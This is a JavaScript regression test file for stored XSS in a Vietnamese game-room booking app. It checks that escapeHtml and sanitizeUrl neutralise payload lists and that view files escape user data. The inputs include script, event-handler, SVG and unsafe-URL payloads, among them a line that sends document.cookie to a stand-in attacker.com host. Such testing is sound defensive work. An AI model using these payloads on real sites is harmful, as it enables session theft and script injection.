/**
 * SEC-02: Stored Cross-Site Scripting (Stored XSS) Security & Regression Tests
 * Kịch Bản Sát V16 - Application Security
 * 
 * Verifies that untrusted data from API/database/user input cannot execute
 * arbitrary script or inject unescaped DOM elements across all frontend views.
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { escapeHtml, sanitizeUrl } from '../src/utils/sanitize.js';

// ============================================================================
// 1. PAYLOAD CATEGORY SUITE (6 REQUIRED CATEGORIES)
// ============================================================================

test('XSS Category 1: HTML Injections are neutralized', () => {
  const payloads = [
    '<h1>Tiêu đề kịch bản</h1>',
    '<b>Chữ đậm</b> và <i>chữ nghiêng</i>',
    '<div class="danger">Cảnh báo</div>',
    'Chủ phòng <span style="color:red">Vip</span>'
  ];

  for (const payload of payloads) {
    const escaped = escapeHtml(payload);
    assert.ok(!escaped.includes('<'), `Unescaped "<" found in: ${escaped}`);
    assert.ok(!escaped.includes('>'), `Unescaped ">" found in: ${escaped}`);
    assert.ok(escaped.includes('&lt;'), `Missing &lt; in: ${escaped}`);
    assert.ok(escaped.includes('&gt;'), `Missing &gt; in: ${escaped}`);
  }
});

test('XSS Category 2: Script Tag Injections are neutralized', () => {
  const payloads = [
    '<script>alert("XSS")</script>',
    '<script src="https://attacker.com/evil.js"></script>',
    '<SCRIPT>document.location="https://attacker.com/steal?c="+document.cookie</SCRIPT>',
    '<script\x20type="text/javascript">javascript:alert(1);</script>'
  ];

  for (const payload of payloads) {
    const escaped = escapeHtml(payload);
    assert.ok(!escaped.includes('<script'), `Raw script tag found in: ${escaped}`);
    assert.ok(!escaped.includes('</script>'), `Raw closing script tag found in: ${escaped}`);
    assert.ok(escaped.includes('&lt;'), `Missing &lt; in: ${escaped}`);
    assert.ok(escaped.includes('&gt;'), `Missing &gt; in: ${escaped}`);
  }
});

test('XSS Category 3: Event Handler Injections are neutralized in HTML context', () => {
  const payloads = [
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(document.cookie)">',
    '<body onload="alert(\'XSS\')">',
    '<input type="text" autofocus onfocus="alert(1)">',
    '<video src="1" onerror="javascript:alert(1)"></video>'
  ];

  for (const payload of payloads) {
    const escaped = escapeHtml(payload);
    assert.ok(!escaped.includes('<img'), `Raw <img tag found in: ${escaped}`);
    assert.ok(!escaped.includes('<svg'), `Raw <svg tag found in: ${escaped}`);
    assert.ok(!escaped.includes('<body'), `Raw <body tag found in: ${escaped}`);
    assert.ok(!escaped.includes('<input'), `Raw <input tag found in: ${escaped}`);
    assert.ok(!escaped.includes('<video'), `Raw <video tag found in: ${escaped}`);
    assert.ok(escaped.includes('&lt;'), `Tag was not escaped: ${escaped}`);
  }
});

test('XSS Category 4: Attribute Injections are neutralized', () => {
  const payloads = [
    { input: '" onmouseover="alert(1)" data-id="', expectedEntity: '&quot;' },
    { input: '\' onfocus=\'alert(1)\' class=\'', expectedEntity: '&#039;' },
    { input: '"><script>alert(1)</script><div title="', expectedEntity: '&quot;' }
  ];

  for (const { input, expectedEntity } of payloads) {
    const escaped = escapeHtml(input);
    assert.ok(!escaped.includes('"'), `Unescaped double quote in: ${escaped}`);
    assert.ok(!escaped.includes("'"), `Unescaped single quote in: ${escaped}`);
    assert.ok(escaped.includes(expectedEntity), `Missing expected entity ${expectedEntity} in: ${escaped}`);
  }
});

test('XSS Category 5: SVG and XML Injections are neutralized', () => {
  const payloads = [
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',
    '<xml><style>*{background:url("javascript:alert(1)")}</style></xml>'
  ];

  for (const payload of payloads) {
    const escaped = escapeHtml(payload);
    assert.ok(!escaped.includes('<svg'), `Unescaped <svg in: ${escaped}`);
    assert.ok(!escaped.includes('<xml'), `Unescaped <xml in: ${escaped}`);
    assert.ok(escaped.includes('&lt;'), `Missing &lt; in: ${escaped}`);
  }
});

test('XSS Category 6: Unsafe URL Schemes are rejected by sanitizeUrl', () => {
  const maliciousUrls = [
    'javascript:alert(document.domain)',
    'JAVASCRIPT:alert(1)',
    '  javascript:alert(1)  ',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox("XSS")',
    '//attacker.com/evil', // Protocol-relative URL
    'javascript\x00:alert(1)' // Null byte injection
  ];

  for (const url of maliciousUrls) {
    const sanitized = sanitizeUrl(url);
    assert.equal(sanitized, '', `Malicious URL was not blocked: "${url}" -> "${sanitized}"`);
  }

  // Safe URLs must be allowed
  assert.equal(sanitizeUrl('https://example.com/image.png'), 'https://example.com/image.png');
  assert.equal(sanitizeUrl('http://example.com/path'), 'http://example.com/path');
  assert.equal(sanitizeUrl('/src/images/logo.png'), '/src/images/logo.png');
  assert.equal(sanitizeUrl('./assets/style.css'), './assets/style.css');
  assert.equal(sanitizeUrl('tel:0915690033'), 'tel:0915690033');
});

// ============================================================================
// 2. DATA PRESERVATION & VIETNAMESE ACCENTS INTEGRITY
// ============================================================================

test('Data Integrity: Vietnamese accents, unicode, and normal text are preserved', () => {
  const testCases = [
    { input: 'Phòng chơi Kịch Bản Sát V16', expectedContent: 'Phòng chơi Kịch Bản Sát V16' },
    { input: 'Nguyễn Văn Bình & Trần Thị Diệu', expectedContent: 'Nguyễn Văn Bình &amp; Trần Thị Diệu' },
    { input: 'Lý do: Sự cố đột xuất từ chi nhánh', expectedContent: 'Lý do: Sự cố đột xuất từ chi nhánh' },
    { input: 'Đã thanh toán 50.000 VNĐ tiền cọc', expectedContent: 'Đã thanh toán 50.000 VNĐ tiền cọc' },
    { input: 'Quản trò: Hoàng Nam', expectedContent: 'Quản trò: Hoàng Nam' }
  ];

  for (const { input, expectedContent } of testCases) {
    const escaped = escapeHtml(input);
    assert.equal(escaped, expectedContent, `Mangled Vietnamese text for: ${input}`);
  }
});

test('Data Integrity: Null, undefined, empty, and numeric inputs handled safely', () => {
  assert.equal(escapeHtml(null), '');
  assert.equal(escapeHtml(undefined), '');
  assert.equal(escapeHtml(''), '');
  assert.equal(escapeHtml(0), '0');
  assert.equal(escapeHtml(12345), '12345');
  assert.equal(escapeHtml(false), 'false');
});

test('Data Integrity: Quotes and ampersands in game titles and user names', () => {
  const input = 'Phòng "Thám Tử Lừng Danh" & Bạn Bè (Sherlock\'s Room)';
  const escaped = escapeHtml(input);
  assert.equal(
    escaped,
    'Phòng &quot;Thám Tử Lừng Danh&quot; &amp; Bạn Bè (Sherlock&#039;s Room)'
  );
});

// ============================================================================
// 3. SOURCE CODE VERIFICATION: ROOMS VIEW AUDIT
// ============================================================================

test('Source Audit: rooms-view.js escapes all dynamic user and API data', () => {
  const filePath = path.resolve('frontend/src/pages/rooms/rooms-view.js');
  const code = fs.readFileSync(filePath, 'utf-8');

  // Verify escapeHtml import
  assert.ok(code.includes("import { escapeHtml } from '../../utils/sanitize.js';"), 'escapeHtml imported');

  // Verify room.title in detail view is escaped
  assert.ok(code.includes('${escapeHtml(room.title)}'), 'room.title is escaped with escapeHtml');
  assert.ok(!code.includes('<h2>${room.title}</h2>'), 'Unescaped room.title found in h2');

  // Verify game.name and creator_name in detail view are escaped
  assert.ok(code.includes('${escapeHtml(room.game?.name'), 'room.game.name is escaped');
  assert.ok(code.includes('${escapeHtml(room.creator_name'), 'room.creator_name is escaped');

  // Verify participant name and email are escaped
  assert.ok(code.includes('${escapeHtml(p.name || p.user_name'), 'Participant name is escaped');
  assert.ok(code.includes('${escapeHtml(p.email || \'\')}'), 'Participant email is escaped');

  // Verify activeProposal proposer_name and status are escaped
  assert.ok(code.includes('${escapeHtml(activeProposal.proposer_name'), 'Proposal proposer_name is escaped');
});

// ============================================================================
// 4. SOURCE CODE VERIFICATION: ADMIN VIEW AUDIT
// ============================================================================

test('Source Audit: admin-view.js escapes all dynamic user and API data', () => {
  const filePath = path.resolve('frontend/src/pages/admin/admin-view.js');
  const code = fs.readFileSync(filePath, 'utf-8');

  // Verify escapeHtml import
  assert.ok(code.includes("import { escapeHtml } from '../../utils/sanitize.js';"), 'escapeHtml imported in admin-view.js');

  // Verify 403 Forbidden user.name & role are escaped
  assert.ok(code.includes('${escapeHtml(user.name)}'), 'user.name escaped in admin 403');
  assert.ok(code.includes('${escapeHtml(user.role)}'), 'user.role escaped in admin 403');

  // Verify user table u.name and u.email are escaped
  assert.ok(code.includes('${escapeHtml(u.name)}'), 'u.name is escaped in user table');
  assert.ok(code.includes('${escapeHtml(u.email)}'), 'u.email is escaped in user table');

  // Verify rooms table r.game_title, r.host_name, r.room_code are escaped
  assert.ok(code.includes('${escapeHtml(r.game_title || \'Kịch bản\')}'), 'r.game_title is escaped');
  assert.ok(code.includes('${escapeHtml(r.host_name || \'N/A\')}'), 'r.host_name is escaped');
  assert.ok(code.includes('${escapeHtml(r.room_code || \'#\' + r.id)}'), 'r.room_code is escaped');

  // Verify refund table r.user_name and r.reason are escaped
  assert.ok(code.includes('${escapeHtml(r.user_name || \'Người chơi #\' + (r.user_id || \'\'))}'), 'r.user_name is escaped in refund table');
  assert.ok(code.includes('${escapeHtml(r.reason || \'N/A\')}'), 'r.reason is escaped in refund table');
});

// ============================================================================
// 5. SOURCE CODE VERIFICATION: DM VIEW AUDIT
// ============================================================================

test('Source Audit: dm-view.js escapes all dynamic assignments and rejection data', () => {
  const filePath = path.resolve('frontend/src/pages/dm/dm-view.js');
  const code = fs.readFileSync(filePath, 'utf-8');

  // Verify escapeHtml import
  assert.ok(code.includes("import { escapeHtml } from '../../utils/sanitize.js';"), 'escapeHtml imported in dm-view.js');

  // Verify user.name and user.role are escaped
  assert.ok(code.includes('${escapeHtml(user.name)}'), 'user.name escaped in dm-view.js');

  // Verify a.game_title, a.venue_name, a.room_name, a.rejection_reason are escaped
  assert.ok(code.includes('${escapeHtml(a.game_title || \'Kịch bản sát\')}'), 'a.game_title is escaped');
  assert.ok(code.includes('${escapeHtml(a.venue_name || \'Chi nhánh trung tâm\')}'), 'a.venue_name is escaped');
  assert.ok(code.includes('${escapeHtml(a.room_name || \'Phòng Diễn\')}'), 'a.room_name is escaped');
  assert.ok(code.includes('${escapeHtml(a.rejection_reason)}'), 'a.rejection_reason is escaped');
});

// ============================================================================
// 6. SOURCE CODE VERIFICATION: NOTIFICATIONS VIEW AUDIT
// ============================================================================

test('Source Audit: notifications-view.js escapes notification title and content', () => {
  const filePath = path.resolve('frontend/src/pages/notifications/notifications-view.js');
  const code = fs.readFileSync(filePath, 'utf-8');

  // Verify escapeHtml import
  assert.ok(code.includes("import { escapeHtml } from '../../utils/sanitize.js';"), 'escapeHtml imported in notifications-view.js');

  // Verify notification title and content are escaped
  assert.ok(code.includes('${escapeHtml(n.title || \'Thông báo hệ thống\')}'), 'n.title is escaped');
  assert.ok(code.includes('${escapeHtml(n.content || \'\')}'), 'n.content is escaped');
});

// ============================================================================
// 7. SOURCE CODE VERIFICATION: TOAST SYSTEM AUDIT
// ============================================================================

test('Source Audit: toast.js uses textContent for message injection to prevent XSS', () => {
  const filePath = path.resolve('frontend/src/utils/toast.js');
  const code = fs.readFileSync(filePath, 'utf-8');

  assert.ok(code.includes('contentEl.textContent = message'), 'toast uses textContent for message');
  assert.ok(!code.includes('<div>${message}</div>'), 'toast does not interpolate raw ${message} in innerHTML');
});

// ============================================================================
// 8. SIMULATED RENDER TESTS: VERIFY NO RAW INJECTION IN COMPONENT TEMPLATES
// ============================================================================

test('Simulated Component Render: Rooms View Participant with XSS Payload', () => {
  const maliciousParticipant = {
    user_id: 999,
    name: '<script>alert("p_name_xss")</script>',
    email: '"><img src=x onerror=alert("p_email_xss")>',
    status: 'DEPOSITED'
  };

  const renderedHtml = `
    <div>
      <div class="p-name">${escapeHtml(maliciousParticipant.name)}</div>
      <div class="p-email">${escapeHtml(maliciousParticipant.email)}</div>
      <span class="p-status">${escapeHtml(maliciousParticipant.status)}</span>
    </div>
  `;

  assert.ok(!renderedHtml.includes('<script>'), 'Contains raw script tag');
  assert.ok(!renderedHtml.includes('<img'), 'Contains raw img tag');
  assert.ok(renderedHtml.includes('&lt;script&gt;alert(&quot;p_name_xss&quot;)&lt;/script&gt;'), 'Properly escaped script');
  assert.ok(renderedHtml.includes('&quot;&gt;&lt;img src=x onerror=alert(&quot;p_email_xss&quot;)&gt;'), 'Properly escaped img onerror');
});

test('Simulated Component Render: Admin View User Row with XSS Payload', () => {
  const maliciousUser = {
    id: '42"><script>alert(1)</script>',
    name: '<svg onload=alert("admin_xss")>',
    email: 'attacker@evil.com" onfocus="alert(1)',
    role: 'PLAYER',
    is_active: 1
  };

  const renderedRow = `
    <tr>
      <td>#${escapeHtml(maliciousUser.id)}</td>
      <td>${escapeHtml(maliciousUser.name)}</td>
      <td>${escapeHtml(maliciousUser.email)}</td>
      <td>${escapeHtml(maliciousUser.role)}</td>
    </tr>
  `;

  assert.ok(!renderedRow.includes('<svg'), 'Contains raw svg');
  assert.ok(!renderedRow.includes('<script>'), 'Contains raw script');
  assert.ok(renderedRow.includes('&lt;svg onload=alert(&quot;admin_xss&quot;)&gt;'), 'Properly escaped svg payload');
  assert.ok(renderedRow.includes('&quot; onfocus=&quot;alert(1)'), 'Properly escaped onfocus attribute');
});

test('Simulated Component Render: Admin View Refund Row with XSS Reason', () => {
  const maliciousRefund = {
    id: 15,
    user_name: 'Attacker <iframe src="javascript:alert(1)"></iframe>',
    amount: 50000,
    status: 'PENDING',
    reason: 'Trùng lịch <img src=1 onerror=alert("refund_reason_xss")>'
  };

  const renderedRefund = `
    <tr>
      <td>#REF-${escapeHtml(maliciousRefund.id)}</td>
      <td>${escapeHtml(maliciousRefund.user_name)}</td>
      <td>${escapeHtml(maliciousRefund.reason)}</td>
      <td>${escapeHtml(maliciousRefund.status)}</td>
    </tr>
  `;

  assert.ok(!renderedRefund.includes('<iframe'), 'Contains raw iframe');
  assert.ok(!renderedRefund.includes('<img'), 'Contains raw img');
  assert.ok(renderedRefund.includes('&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;'));
  assert.ok(renderedRefund.includes('&lt;img src=1 onerror=alert(&quot;refund_reason_xss&quot;)&gt;'));
});

test('Simulated Component Render: Notification Item with XSS Title & Content', () => {
  const maliciousNotification = {
    id: 101,
    title: '<script>alert("notif_title")</script> Thông báo khẩn',
    content: 'Phòng #104 đã hủy <img src=x onerror=alert("notif_body")>',
    created_at: '2026-11-24T20:00:00Z',
    is_read: false
  };

  const renderedItem = `
    <div>
      <h4>${escapeHtml(maliciousNotification.title)}</h4>
      <p>${escapeHtml(maliciousNotification.content)}</p>
    </div>
  `;

  assert.ok(!renderedItem.includes('<script>'), 'Contains raw script');
  assert.ok(!renderedItem.includes('<img'), 'Contains raw img');
  assert.ok(renderedItem.includes('&lt;script&gt;alert(&quot;notif_title&quot;)&lt;/script&gt;'));
  assert.ok(renderedItem.includes('&lt;img src=x onerror=alert(&quot;notif_body&quot;)&gt;'));
});
